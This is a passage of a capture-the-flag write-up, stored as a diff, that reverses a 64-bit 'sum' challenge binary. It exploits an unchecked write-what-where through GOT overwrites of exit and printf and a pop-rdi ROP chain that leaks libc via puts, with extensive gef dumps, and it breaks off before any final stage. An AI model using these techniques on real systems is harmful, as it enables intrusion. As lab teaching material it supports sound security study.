+$    ./libc.so
+GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.
+Copyright (C) 2018 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.
+There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
+PARTICULAR PURPOSE.
+Compiled by GNU CC version 7.3.0.
+libc ABIs: UNIQUE IFUNC
+For bug reporting instructions, please see:
+&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
+$    ./sum_ccafa40ee6a5a675341787636292bf3c84d17264
+[sum system]
+Input numbers except for 0.
+0 is interpreted as the end of sequence.
+
+[Example]
+2 3 4 0
+1
+5
+0
+6
+$    ./sum_ccafa40ee6a5a675341787636292bf3c84d17264
+[sum system]
+Input numbers except for 0.
+0 is interpreted as the end of sequence.
+
+[Example]
+2 3 4 0
+1
+5
+6
+9
+8
+7
+Segmentation fault (core dumped)
+</code></pre>
+<p>So we can see that it is a <code>64</code> bit elf, with a stack canary, and non-executable stack. The binary appears to add numbers together. We input the numbers one at a time, and a <code>0</code> will end the sequence. If we input 6 digits, it crashes. Let's take a look under the hood.</p>
+<h2><a class="header" href="#reversing" id="reversing">Reversing</a></h2>
+<p>When we take a look at the <code>main</code> function in ghidra, we see this:</p>
+<pre><code>undefined8 main(void)
+
+{
+  ulong uVar1;
+  long in_FS_OFFSET;
+  undefined8 ints;
+  undefined8 local_40;
+  undefined8 local_38;
+  undefined8 local_30;
+  undefined8 local_28;
+  long *amnt;
+  long local_18;
+  long local_10;
+ 
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  ints = 0;
+  local_40 = 0;
+  local_38 = 0;
+  local_30 = 0;
+  local_28 = 0;
+  local_18 = 0;
+  amnt = &amp;local_18;
+  puts(&quot;[sum system]\nInput numbers except for 0.\n0 is interpreted as the end of sequence.\n&quot;);
+  puts(&quot;[Example]\n2 3 4 0&quot;);
+  read_ints((long)&amp;ints,5);
+  uVar1 = sum((long)&amp;ints,amnt);
+  if (5 &lt; (int)uVar1) {
+                    /* WARNING: Subroutine does not return */
+    exit(-1);
+  }
+  printf(&quot;%llu\n&quot;,local_18);
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return 0;
+}
+</code></pre>
+<p>When we look at the main function, we see that it first establishes an int array <code>ints</code>, that can hold 6 integers. The sixth integer in this array is <code>amnt</code>, which is a pointer to the next integer on the stack, <code>local_18</code>. First it prints out some text, then calls <code>read_ints</code>:</p>
+<pre><code>void read_ints(long ints,long amnt)
+
+{
+  int scanfCheck;
+  long in_FS_OFFSET;
+  long i;
+  long stackCanary;
+ 
+  stackCanary = *(long *)(in_FS_OFFSET + 0x28);
+  i = 0;
+  while (i &lt;= amnt) {
+    scanfCheck = __isoc99_scanf(&amp;DAT_00400a68,ints + i * 8,i * 8);
+    if (scanfCheck != 1) {
+                    /* WARNING: Subroutine does not return */
+      exit(-1);
+    }
+    if (*(long *)(ints + i * 8) == 0) break;
+    i = i + 1;
+  }
+  if (stackCanary == *(long *)(in_FS_OFFSET + 0x28)) {
+    return;
+  }
+                    /* WARNING: Subroutine does not return */
+  __stack_chk_fail();
+}
+</code></pre>
+<p>So here we can see it will scan in integers into the array passed by it's first argument, until it either gets a <code>0</code> or it scans in <code>amnt</code> + 1 integers. Under the context it is called, it will scan in a maximum of <code>6</code> integers into the <code>ints</code> array. Proceeding that it calls <code>sum</code>, with the arguments being the <code>ints</code> array and <code>amnt</code>:</p>
+<pre><code>ulong sum(long ints,long *x)
+
+{
+  long in_FS_OFFSET;
+  uint i;
+  long canary;
+ 
+  canary = *(long *)(in_FS_OFFSET + 0x28);
+  *x = 0;
+  i = 0;
+  while (*(long *)(ints + (long)(int)i * 8) != 0) {
+    *x = *(long *)(ints + (long)(int)i * 8) + *x;
+    i = i + 1;
+  }
+  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return (ulong)i;
+}
+</code></pre>
+<p>So we can see that it adds up all of the values in <code>ints</code>, and stores them in <code>x</code>. In the context that it is called, it will add up the six (or less) values stored in <code>ints</code>, and store it in <code>amnt</code>. In addition to that, there is an integer overflow bug here, since it doesn't check if the values it is adding together will cause an overflow. Since we control <code>amnt</code>, we effectively have a write what where. The value returned is the number of numbers it added together. Looking at the rest of the main function, we see that if we gave it six numbers (thus causing the write what where bug), it will call <code>exit</code>. If not it will call <code>printf</code> and return from main.</p>
+<h2><a class="header" href="#exploitation" id="exploitation">Exploitation</a></h2>
+<p>So we have a write what where, with no relro or pie. The first problem is that right after our write, it will call <code>exit</code>. This can be solved by just overwriting the got address of <code>exit</code> (<code>0x601048</code>) with the start of <code>main</code> (<code>0x400903</code>). That way when it calls <code>exit</code>, it will just put us back at the start of <code>main</code>. This will give us a loop where we get multiple qword writes.</p>
+<p>Now the next hurdle is getting a libc infoleak. At this point, one of my team-mates mksrg gave me the idea to do a stack pivot. When we take a look at the stack layout when <code>printf</code> is called (<code>exit</code> will also have this), we see something interesting:</p>
+<pre><code>gef➤  b *0x4009bf
+Breakpoint 1 at 0x4009bf
+gef➤  r
+Starting program: /home/guyinatuxedo/Desktop/sum/sum_ccafa40ee6a5a675341787636292bf3c84d17264
+[sum system]
+Input numbers except for 0.
+0 is interpreted as the end of sequence.
+
+[Example]
+2 3 4 0
+159
+357
+951
+753
+0
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0               
+$rbx   : 0x0               
+$rcx   : 0x0               
+$rdx   : 0x20              
+$rsp   : 0x00007fffffffdee0  →  0x000000000000009f
+$rbp   : 0x00007fffffffdf20  →  0x00000000004009e0  →  &lt;__libc_csu_init+0&gt; push r15
+$rsi   : 0x8ac             
+$rdi   : 0x0000000000400ad5  →  0x0100000a756c6c25 (&quot;%llu&quot;?)
+$rip   : 0x00000000004009bf  →  &lt;main+188&gt; call 0x400620 &lt;printf@plt&gt;
+$r8    : 0x0               
+$r9    : 0x0               
+$r10   : 0x00007ffff7b82cc0  →  0x0002000200020002
+$r11   : 0x0000000000400a6c  →   add BYTE PTR [rax], al
+$r12   : 0x0000000000400670  →  &lt;_start+0&gt; xor ebp, ebp
+$r13   : 0x00007fffffffe000  →  0x0000000000000001
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [zero CARRY PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
+────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffdee0│+0x0000: 0x000000000000009f     ← $rsp
+0x00007fffffffdee8│+0x0008: 0x0000000000000165
+0x00007fffffffdef0│+0x0010: 0x00000000000003b7
+0x00007fffffffdef8│+0x0018: 0x00000000000002f1
+0x00007fffffffdf00│+0x0020: 0x0000000000000000
+0x00007fffffffdf08│+0x0028: 0x00007fffffffdf10  →  0x00000000000008ac
+0x00007fffffffdf10│+0x0030: 0x00000000000008ac
+0x00007fffffffdf18│+0x0038: 0x571694db34020d00
+──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x4009af &lt;main+172&gt;       lock   mov rsi, rax
+     0x4009b3 &lt;main+176&gt;       lea    rdi, [rip+0x11b]        # 0x400ad5
+     0x4009ba &lt;main+183&gt;       mov    eax, 0x0
+ →   0x4009bf &lt;main+188&gt;       call   0x400620 &lt;printf@plt&gt;
+   ↳    0x400620 &lt;printf@plt+0&gt;   jmp    QWORD PTR [rip+0x200a02]        # 0x601028
+        0x400626 &lt;printf@plt+6&gt;   push   0x2
+        0x40062b &lt;printf@plt+11&gt;  jmp    0x4005f0
+        0x400630 &lt;alarm@plt+0&gt;    jmp    QWORD PTR [rip+0x2009fa]        # 0x601030
+        0x400636 &lt;alarm@plt+6&gt;    push   0x3
+        0x40063b &lt;alarm@plt+11&gt;   jmp    0x4005f0
+──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
+printf@plt (
+   $rdi = 0x0000000000400ad5 → 0x0100000a756c6c25 (&quot;%llu&quot;?),
+   $rsi = 0x00000000000008ac,
+   $rdx = 0x0000000000000020,
+   $rcx = 0x0000000000000000
+)
+──────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;sum_ccafa40ee6a&quot;, stopped, reason: BREAKPOINT
+────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x4009bf → main()
+─────────────────────────────────────────────────────────────────────────────────────────────────────
+
+Breakpoint 1, 0x00000000004009bf in main ()
+gef➤  
+</code></pre>
+<p>So when <code>printf</code> is called, the values on the stack are the numbers that we sent to be added up. Of course, when the <code>call</code> instruction happens the return address (the instruction right after the call) will be pushed onto the stack. But after that on the stack, will be values we control. So if we were to overwrite the got address of <code>printf</code> with a rop gadget like <code>pop rdi; ret</code>, we can start roping.</p>
+<p>To find out ROP gadget:</p>
+<pre><code>$    ROPgadget --binary sum_ccafa40ee6a5a675341787636292bf3c84d17264 | grep &quot;pop rdi&quot;
+0x0000000000400a43 : pop rdi ; ret
+</code></pre>
+<p>Now for the rop chain itself, it will contain the following values:</p>
+<pre><code>0x00:    popRdi Instruction
+0x08:    got address of puts
+0x10:    plt address of puts
+0x18:    0x4009a7 (the `exit` call, so we will loop back to main)
+0x20:    &quot;0&quot; (to end the number sequence)
+</code></pre>
+<p>First off, remember that this chain is executed when <code>printf</code> is called, after we overwrite the got address of printf with <code>0x400a43</code>. Now this is just a rop chain to give us a libc infoleak by using <code>puts</code> to print the got address of <code>puts</code>. When I first tried this, I ran into some issues where what I was doing was messing with some of the internals of puts/scanf. I played around with what I was calling, and where I was jumping, and after a little bit I got something that worked. Let's see this rop gadget in action:</p>
+<p>First we hit printf:</p>
+<pre><code>───────────────────────────────────────────────────────────────────── stack ────
+0x00007ffcc5e05900│+0x0000: 0x0000000000400a43  →  &lt;__libc_csu_init+99&gt; pop rdi ← $rsp
+0x00007ffcc5e05908│+0x0008: 0x0000000000601018  →  0x00007fc3902639c0  →  &lt;puts+0&gt; push r13
+0x00007ffcc5e05910│+0x0010: 0x0000000000400600  →  &lt;puts@plt+0&gt; jmp QWORD PTR [rip+0x200a12]        # 0x601018
+0x00007ffcc5e05918│+0x0018: 0x00000000004009a7  →  &lt;main+164&gt; call 0x400660 &lt;exit@plt&gt;
+0x00007ffcc5e05920│+0x0020: 0x0000000000000000
+0x00007ffcc5e05928│+0x0028: 0x00007ffcc5e05930  →  0x0000000001202a02
+0x00007ffcc5e05930│+0x0030: 0x0000000001202a02
+0x00007ffcc5e05938│+0x0038: 0x791fd3bfbdbc2c00
+─────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x4009af &lt;main+172&gt;       lock   mov rsi, rax
+     0x4009b3 &lt;main+176&gt;       lea    rdi, [rip+0x11b]        # 0x400ad5
+     0x4009ba &lt;main+183&gt;       mov    eax, 0x0
+ →   0x4009bf &lt;main+188&gt;       call   0x400620 &lt;printf@plt&gt;
+   ↳    0x400620 &lt;printf@plt+0&gt;   jmp    QWORD PTR [rip+0x200a02]        # 0x601028
+        0x400626 &lt;printf@plt+6&gt;   push   0x2
+        0x40062b &lt;printf@plt+11&gt;  jmp    0x4005f0
+        0x400630 &lt;alarm@plt+0&gt;    jmp    QWORD PTR [rip+0x2009fa]        # 0x601030
+        0x400636 &lt;alarm@plt+6&gt;    push   0x3
+        0x40063b &lt;alarm@plt+11&gt;   jmp    0x4005f0
+─────────────────────────────────────────────────────── arguments (guessed) ────
+printf@plt (
+   $rdi = 0x0000000000400ad5 → 0x0100000a756c6c25 (&quot;%llu&quot;?),
+   $rsi = 0x0000000001202a02,
+   $rdx = 0x0000000000000020,
+   $rcx = 0x0000000000000000
+)
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;sum_ccafa40ee6a&quot;, stopped, reason: BREAKPOINT
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x4009bf → main()
+────────────────────────────────────────────────────────────────────────────────
+
+Breakpoint 1, 0x00000000004009bf in main ()
+gef➤  
+</code></pre>
+<p>Then we have an iteration of the <code>pop rdi; ret</code> instruction to rid ourselves of the return address pushed onto the stack by <code>call</code>:</p>
+<pre><code>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffcc5e058f8│+0x0000: 0x00000000004009c4  →  &lt;main+193&gt; mov eax, 0x0     ← $rsp
+0x00007ffcc5e05900│+0x0008: 0x0000000000400a43  →  &lt;__libc_csu_init+99&gt; pop rdi
+0x00007ffcc5e05908│+0x0010: 0x0000000000601018  →  0x00007fc3902639c0  →  &lt;puts+0&gt; push r13
+0x00007ffcc5e05910│+0x0018: 0x0000000000400600  →  &lt;puts@plt+0&gt; jmp QWORD PTR [rip+0x200a12]        # 0x601018
+0x00007ffcc5e05918│+0x0020: 0x00000000004009a7  →  &lt;main+164&gt; call 0x400660 &lt;exit@plt&gt;
+0x00007ffcc5e05920│+0x0028: 0x0000000000000000
+0x00007ffcc5e05928│+0x0030: 0x00007ffcc5e05930  →  0x0000000001202a02
+0x00007ffcc5e05930│+0x0038: 0x0000000001202a02
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+ →   0x400a43 &lt;__libc_csu_init+99&gt; pop    rdi
+     0x400a44 &lt;__libc_csu_init+100&gt; ret    
+     0x400a45                  nop    
+     0x400a46                  nop    WORD PTR cs:[rax+rax*1+0x0]
+     0x400a50 &lt;__libc_csu_fini+0&gt; repz   ret
+     0x400a52                  add    BYTE PTR [rax], al
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;sum_ccafa40ee6a&quot;, stopped, reason: SINGLE STEP
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400a43 → __libc_csu_init()
+[#1] 0x400a43 → __libc_csu_init()
+[#2] 0x400600 → jmp QWORD PTR [rip+0x200a12]        # 0x601018
+[#3] 0x7ffcc5e05930 → add ch, BYTE PTR [rdx]
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+0x0000000000400a43 in __libc_csu_init ()
+gef➤  
+gef➤  s
+
+Program received signal SIGALRM, Alarm clock.
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0               
+$rbx   : 0x0               
+$rcx   : 0x0               
+$rdx   : 0x20              
+$rsp   : 0x00007ffcc5e05900  →  0x0000000000400a43  →  &lt;__libc_csu_init+99&gt; pop rdi
+$rbp   : 0x00007ffcc5e05940  →  0x00007ffcc5e05990  →  0x00007ffcc5e059e0  →  0x00000000004009e0  →  &lt;__libc_csu_init+0&gt; push r15
+$rsi   : 0x1202a02         
+$rdi   : 0x00000000004009c4  →  &lt;main+193&gt; mov eax, 0x0
+$rip   : 0x0000000000400a44  →  &lt;__libc_csu_init+100&gt; ret
+$r8    : 0x0               
+$r9    : 0x0               
+$r10   : 0x00007fc390381cc0  →  0x0002000200020002
+$r11   : 0x0000000000400a6c  →   add BYTE PTR [rax], al
+$r12   : 0x0000000000400670  →  &lt;_start+0&gt; xor ebp, ebp
+$r13   : 0x00007ffcc5e05ac0  →  0x0000000000000001
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [zero CARRY PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffcc5e05900│+0x0000: 0x0000000000400a43  →  &lt;__libc_csu_init+99&gt; pop rdi     ← $rsp
+0x00007ffcc5e05908│+0x0008: 0x0000000000601018  →  0x00007fc3902639c0  →  &lt;puts+0&gt; push r13
+0x00007ffcc5e05910│+0x0010: 0x0000000000400600  →  &lt;puts@plt+0&gt; jmp QWORD PTR [rip+0x200a12]        # 0x601018
+0x00007ffcc5e05918│+0x0018: 0x00000000004009a7  →  &lt;main+164&gt; call 0x400660 &lt;exit@plt&gt;
+0x00007ffcc5e05920│+0x0020: 0x0000000000000000
+0x00007ffcc5e05928│+0x0028: 0x00007ffcc5e05930  →  0x0000000001202a02
+0x00007ffcc5e05930│+0x0030: 0x0000000001202a02
+0x00007ffcc5e05938│+0x0038: 0x791fd3bfbdbc2c00
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x400a3e &lt;__libc_csu_init+94&gt; pop    r13
+     0x400a40 &lt;__libc_csu_init+96&gt; pop    r14
+     0x400a42 &lt;__libc_csu_init+98&gt; pop    r15
+ →   0x400a44 &lt;__libc_csu_init+100&gt; ret    
+   ↳    0x400a43 &lt;__libc_csu_init+99&gt; pop    rdi
+        0x400a44 &lt;__libc_csu_init+100&gt; ret    
+        0x400a45                  nop    
+        0x400a46                  nop    WORD PTR cs:[rax+rax*1+0x0]
+        0x400a50 &lt;__libc_csu_fini+0&gt; repz   ret
+        0x400a52                  add    BYTE PTR [rax], al
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;sum_ccafa40ee6a&quot;, stopped, reason: SINGLE STEP
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400a44 → __libc_csu_init()
+[#1] 0x400a43 → __libc_csu_init()
+[#2] 0x400600 → jmp QWORD PTR [rip+0x200a12]        # 0x601018
+[#3] 0x7ffcc5e05930 → add ch, BYTE PTR [rdx]
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+0x0000000000400a44 in __libc_csu_init ()
+gef➤  s
+</code></pre>
+<p>Next we execute the infoleak by popping the got address of puts into the rdi register:</p>
+<pre><code>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffcc5e05908│+0x0000: 0x0000000000601018  →  0x00007fc3902639c0  →  &lt;puts+0&gt; push r13     ← $rsp
+0x00007ffcc5e05910│+0x0008: 0x0000000000400600  →  &lt;puts@plt+0&gt; jmp QWORD PTR [rip+0x200a12]        # 0x601018
+0x00007ffcc5e05918│+0x0010: 0x00000000004009a7  →  &lt;main+164&gt; call 0x400660 &lt;exit@plt&gt;
+0x00007ffcc5e05920│+0x0018: 0x0000000000000000
+0x00007ffcc5e05928│+0x0020: 0x00007ffcc5e05930  →  0x0000000001202a02
+0x00007ffcc5e05930│+0x0028: 0x0000000001202a02
+0x00007ffcc5e05938│+0x0030: 0x791fd3bfbdbc2c00
+0x00007ffcc5e05940│+0x0038: 0x00007ffcc5e05990  →  0x00007ffcc5e059e0  →  0x00000000004009e0  →  &lt;__libc_csu_init+0&gt; push r15     ← $rbp
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+ →   0x400a43 &lt;__libc_csu_init+99&gt; pop    rdi
+     0x400a44 &lt;__libc_csu_init+100&gt; ret    
+     0x400a45                  nop    
+     0x400a46                  nop    WORD PTR cs:[rax+rax*1+0x0]
+     0x400a50 &lt;__libc_csu_fini+0&gt; repz   ret
+     0x400a52                  add    BYTE PTR [rax], al
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;sum_ccafa40ee6a&quot;, stopped, reason: SINGLE STEP
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400a43 → __libc_csu_init()
+[#1] 0x400600 → jmp QWORD PTR [rip+0x200a12]        # 0x601018
+[#2] 0x7ffcc5e05930 → add ch, BYTE PTR [rdx]
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+0x0000000000400a43 in __libc_csu_init ()
+gef➤  s
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0               
+$rbx   : 0x0               
+$rcx   : 0x0               
+$rdx   : 0x20              
+$rsp   : 0x00007ffcc5e05910  →  0x0000000000400600  →  &lt;puts@plt+0&gt; jmp QWORD PTR [rip+0x200a12]        # 0x601018
+$rbp   : 0x00007ffcc5e05940  →  0x00007ffcc5e05990  →  0x00007ffcc5e059e0  →  0x00000000004009e0  →  &lt;__libc_csu_init+0&gt; push r15
+$rsi   : 0x1202a02         
+$rdi   : 0x0000000000601018  →  0x00007fc3902639c0  →  &lt;puts+0&gt; push r13
+$rip   : 0x0000000000400a44  →  &lt;__libc_csu_init+100&gt; ret
+$r8    : 0x0               
+$r9    : 0x0               
+$r10   : 0x00007fc390381cc0  →  0x0002000200020002
+$r11   : 0x0000000000400a6c  →   add BYTE PTR [rax], al
+$r12   : 0x0000000000400670  →  &lt;_start+0&gt; xor ebp, ebp
+$r13   : 0x00007ffcc5e05ac0  →  0x0000000000000001
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [zero CARRY PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffcc5e05910│+0x0000: 0x0000000000400600  →  &lt;puts@plt+0&gt; jmp QWORD PTR [rip+0x200a12]        # 0x601018     ← $rsp
+0x00007ffcc5e05918│+0x0008: 0x00000000004009a7  →  &lt;main+164&gt; call 0x400660 &lt;exit@plt&gt;
+0x00007ffcc5e05920│+0x0010: 0x0000000000000000
+0x00007ffcc5e05928│+0x0018: 0x00007ffcc5e05930  →  0x0000000001202a02
+0x00007ffcc5e05930│+0x0020: 0x0000000001202a02
+0x00007ffcc5e05938│+0x0028: 0x791fd3bfbdbc2c00
+0x00007ffcc5e05940│+0x0030: 0x00007ffcc5e05990  →  0x00007ffcc5e059e0  →  0x00000000004009e0  →  &lt;__libc_csu_init+0&gt; push r15     ← $rbp
+0x00007ffcc5e05948│+0x0038: 0x00000000004009ac  →  &lt;main+169&gt; mov rax, QWORD PTR [rbp-0x10]
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x400a3e &lt;__libc_csu_init+94&gt; pop    r13
+     0x400a40 &lt;__libc_csu_init+96&gt; pop    r14
+     0x400a42 &lt;__libc_csu_init+98&gt; pop    r15
+ →   0x400a44 &lt;__libc_csu_init+100&gt; ret    
+   ↳    0x400600 &lt;puts@plt+0&gt;     jmp    QWORD PTR [rip+0x200a12]        # 0x601018
+        0x400606 &lt;puts@plt+6&gt;     push   0x0
+        0x40060b &lt;puts@plt+11&gt;    jmp    0x4005f0
+        0x400610 &lt;__stack_chk_fail@plt+0&gt; jmp    QWORD PTR [rip+0x200a0a]        # 0x601020
+        0x400616 &lt;__stack_chk_fail@plt+6&gt; push   0x1
+        0x40061b &lt;__stack_chk_fail@plt+11&gt; jmp    0x4005f0
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;sum_ccafa40ee6a&quot;, stopped, reason: SINGLE STEP
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400a44 → __libc_csu_init()
+[#1] 0x400600 → jmp QWORD PTR [rip+0x200a12]        # 0x601018
+[#2] 0x7ffcc5e05930 → add ch, BYTE PTR [rdx]
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+0x0000000000400a44 in __libc_csu_init ()
+gef➤  x/g $rdi
+0x601018:    0x7fc3902639c0
+gef➤  x/5i 0x7fc3902639c0
+   0x7fc3902639c0 &lt;puts&gt;:    push   r13
+   0x7fc3902639c2 &lt;puts+2&gt;:    push   r12
+   0x7fc3902639c4 &lt;puts+4&gt;:    mov    r12,rdi
+   0x7fc3902639c7 &lt;puts+7&gt;:    push   rbp
+   0x7fc3902639c8 &lt;puts+8&gt;:    push   rbx
+</code></pre>
+<p>after that we call <code>printf</code>:</p>
+<pre><code>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffcc5e05918│+0x0000: 0x00000000004009a7  →  &lt;main+164&gt; call 0x400660 &lt;exit@plt&gt;     ← $rsp
+0x00007ffcc5e05920│+0x0008: 0x0000000000000000
+0x00007ffcc5e05928│+0x0010: 0x00007ffcc5e05930  →  0x0000000001202a02
+0x00007ffcc5e05930│+0x0018: 0x0000000001202a02
+0x00007ffcc5e05938│+0x0020: 0x791fd3bfbdbc2c00
+0x00007ffcc5e05940│+0x0028: 0x00007ffcc5e05990  →  0x00007ffcc5e059e0  →  0x00000000004009e0  →  &lt;__libc_csu_init+0&gt; push r15     ← $rbp
+0x00007ffcc5e05948│+0x0030: 0x00000000004009ac  →  &lt;main+169&gt; mov rax, QWORD PTR [rbp-0x10]
+0x00007ffcc5e05950│+0x0038: 0x7fffffffffffffff
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7fc3902639b2 &lt;popen+130&gt;      jmp    0x7fc39026398d &lt;popen+93&gt;
+   0x7fc3902639b4                  nop    WORD PTR cs:[rax+rax*1+0x0]
+   0x7fc3902639be                  xchg   ax, ax
+ → 0x7fc3902639c0 &lt;puts+0&gt;         push   r13
+   0x7fc3902639c2 &lt;puts+2&gt;         push   r12
+   0x7fc3902639c4 &lt;puts+4&gt;         mov    r12, rdi
+   0x7fc3902639c7 &lt;puts+7&gt;         push   rbp
+   0x7fc3902639c8 &lt;puts+8&gt;         push   rbx
+   0x7fc3902639c9 &lt;puts+9&gt;         sub    rsp, 0x8
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;sum_ccafa40ee6a&quot;, stopped, reason: SINGLE STEP
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x7fc3902639c0 → puts()
+[#1] 0x4009a7 → main()
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+0x00007fc3902639c0 in puts () from ./libc.so
+gef➤  finish
+</code></pre>
+<p>Then we end up at <code>exit</code>, which will bring us back to the start of <code>main</code>:</p>
+<pre><code>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffcc5e05920│+0x0000: 0x0000000000000000     ← $rsp
+0x00007ffcc5e05928│+0x0008: 0x00007ffcc5e05930  →  0x0000000001202a02
+0x00007ffcc5e05930│+0x0010: 0x0000000001202a02
+0x00007ffcc5e05938│+0x0018: 0x791fd3bfbdbc2c00
+0x00007ffcc5e05940│+0x0020: 0x00007ffcc5e05990  →  0x00007ffcc5e059e0  →  0x00000000004009e0  →  &lt;__libc_csu_init+0&gt; push r15     ← $rbp
+0x00007ffcc5e05948│+0x0028: 0x00000000004009ac  →  &lt;main+169&gt; mov rax, QWORD PTR [rbp-0x10]
+0x00007ffcc5e05950│+0x0030: 0x7fffffffffffffff
+0x00007ffcc5e05958│+0x0038: 0x7fffffffff9fefd7
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x40099b &lt;main+152&gt;       (bad)  
+     0x40099c &lt;main+153&gt;       inc    DWORD PTR [rbx+0xa7e05f8]
+     0x4009a2 &lt;main+159&gt;       mov    edi, 0xffffffff
+ →   0x4009a7 &lt;main+164&gt;       call   0x400660 &lt;exit@plt&gt;
+   ↳    0x400660 &lt;exit@plt+0&gt;     jmp    QWORD PTR [rip+0x2009e2]        # 0x601048
+        0x400666 &lt;exit@plt+6&gt;     push   0x6
+        0x40066b &lt;exit@plt+11&gt;    jmp    0x4005f0
+        0x400670 &lt;_start+0&gt;       xor    ebp, ebp
+        0x400672 &lt;_start+2&gt;       mov    r9, rdx
+        0x400675 &lt;_start+5&gt;       pop    rsi
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
+exit@plt (
+   $rdi = 0x0000000000000001,
+   $rsi = 0x00007fc3905cf7e3 → 0x5d08c0000000000a,
+   $rdx = 0x00007fc3905d08c0 → 0x0000000000000000,
+   $rcx = 0x00007fc3902f3154 → 0x5477fffff0003d48 (&quot;H=&quot;?)
+)
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;sum_ccafa40ee6a&quot;, stopped, reason: BREAKPOINT
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x4009a7 → main()
